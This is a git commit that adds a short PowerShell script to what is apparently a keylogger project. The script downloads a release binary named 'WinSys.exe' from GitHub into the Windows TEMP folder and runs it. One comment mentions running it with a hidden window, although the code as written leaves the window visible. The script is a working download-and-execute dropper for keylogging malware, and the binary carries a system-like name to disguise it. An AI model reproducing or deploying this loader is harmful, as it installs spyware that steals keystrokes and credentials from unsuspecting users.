a1d9355943f037528727e7f861daea17472fb6db
Sumit Sharma <84061534+Su-nlight@users.noreply.github.com>
2024-07-23 19:11:53 +0530

    Create debug_inject_to_windows.ps1
    creating this for debugging purposes

---
+++ debug_inject_to_windows.ps1
@@ -0,0 +1,19 @@
+# this file will be used for debugging purposes and is not meant for finalisation
+# Define variables
+$repoOwner = "Su-nlight"                  # Replace with the repository owner
+$repoName = "keylogger"                    # Replace with the repository name
+$releaseTag = "v0.2.2-alpha"                # Replace with the desired release tag
+$assetName = "WinSys.exe"            # Replace with the asset file name you want to download
+$downloadUrl = "https://github.com/$repoOwner/$repoName/releases/download/$releaseTag/$assetName"
+
+# Define paths
+$tempFile = [System.IO.Path]::Combine($env:TEMP, $assetName)
+
+# Download the file
+Write-Output "Downloading $downloadUrl to $tempFile..."
+Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile
+
+# Execute the file with hidden window
+Write-Output "Executing $tempFile..."
+Start-Process $tempFile 
+# "WindowStyle" property is default i.e. not hidden
